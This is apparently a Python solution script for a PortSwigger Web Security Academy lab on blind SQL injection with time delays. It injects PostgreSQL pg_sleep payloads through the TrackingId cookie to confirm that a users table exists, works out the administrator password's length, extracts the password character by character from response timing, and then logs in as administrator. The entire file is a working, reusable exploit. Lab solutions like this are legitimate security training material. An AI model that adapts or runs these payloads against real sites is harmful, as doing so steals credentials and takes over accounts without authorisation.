#!/usr/bin/env python3
# Lab: Blind SQL injection with time delays and information retrieval
# Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
cookie_name = 'TrackingId'
tracking_cookie = None
delay = 3


def get_tracking_cookie(client, host):
    global tracking_cookie
    r = client.get(host)
    if r.status_code != 200:
        raise RuntimeError('Unexpected return status received when obtaining tracking cookie')
    tracking_cookie = client.cookies.get(cookie_name)


def send_request(client, host, payload):
    client.cookies.set(cookie_name, f'{tracking_cookie}{payload}', domain=f'{host[8:]}')
    r = client.get(host)
    if r.elapsed.total_seconds() > delay:
        return True
    return False


def verify_structure(client, host):
    if not send_request(client, host, f"'||(SELECT pg_sleep({delay}))||'"):
        raise RuntimeError('Could not verify usage of PostgreSQL')
    print(f'[+]   DB is PostgreSQL')

    if not send_request(client, host, f"'||(SELECT pg_sleep({delay}) FROM users LIMIT 1)||'"):
        raise RuntimeError('Could not verify existence of users table')
    print(f'[+]   DB has users table')

    if not send_request(client, host, f"'||(SELECT pg_sleep({delay})||username||password FROM users LIMIT 1)||'"):
        raise RuntimeError('Could not verify existence of expected columns in users table')
    print(f'[+]   users table contains columns username and password')

    if not send_request(client, host, f"'||(SELECT pg_sleep({delay})||username||password FROM users WHERE username='administrator')||'"):
        raise RuntimeError('Could not verify existence of expected columns in users table')
    print(f'[+]   users table contains username administrator')


def get_password_length(client, host):
    for i in range(1, 51):
        if send_request(client, host, f"'||(SELECT pg_sleep(3) FROM users WHERE username='administrator' AND LENGTH(password)={i})||'"):
            return i
    return False


def get_password(client, host, length):
    # For full ASCII range use this. The lab only uses numbers and lower characters, so the latter version is simply faster
    # chars = range(32, 127)
    chars = [x for x in range(48, 58)] + [x for x in range(97, 123)]
    password = ''
    sys.stdout.write('\r[ ]   Current extraction status: ')
    sys.stdout.flush()
    for i in range(1, length + 1):
        found = False
        for j in chars:
            payload = f"'||(SELECT pg_sleep({delay}) FROM users WHERE username='administrator' AND SUBSTR(password,{i},1)='{chr(j)}')||'"
            if send_request(client, host, payload):
                password += chr(j)
                found = True
                break
        sys.stdout.write('\r[ ]   Current extraction status: ' + password)
        sys.stdout.flush()
        if not found:
            raise RuntimeError(f'Exhausted possible characters, failed to find character on position {i}')

    print()
    return password


def login(host, password):
    def get_csrf_token(client, url):
        r = client.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']
    client = requests.Session()
    client.proxies = proxies
    client.verify = False

    url = f"{host}/login"
    csrf = get_csrf_token(client, url)
    if not csrf:
        print(f'[-] Unable to obtain csrf token')
        sys.exit(-2)

    payload = {'csrf': csrf,
               'username': 'administrator',
               'password': password}
    r = client.post(url, data=payload, allow_redirects=True)
    return 'Congratulations, you solved the lab!' in r.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Attempting blind SQL injection with time delay, using {delay}s as threshold')

    client = requests.Session()
    client.verify = False
    client.proxies = proxies
    get_tracking_cookie(client, host)
    print(f'[+] Obtained tracking cookie: {tracking_cookie}')

    print(f'[ ] Verify that structure of lab is as expected')
    verify_structure(client, host)

    print(f'[ ] Attempt to obtain password length')
    password_length = get_password_length(client, host)
    if not password_length:
        print(f'[-] Failed to enumerate password length')
        sys.exit(-2)
    print(f'[+]   Found password length: {password_length}')

    print(f'[ ] Attempt to extract password')
    password = get_password(client, host, password_length)
    if not password:
        print(f'[-] Failed to extract password')
        sys.exit(-2)
    print(f'[+] Found password: {password}')

    print('[ ] Try to login as administrator')
    if login(host, password):
        print('[+] Login as administrator successful')
    else:
        print('[-] Failed to login as administrator')


if __name__ == '__main__':
    main()
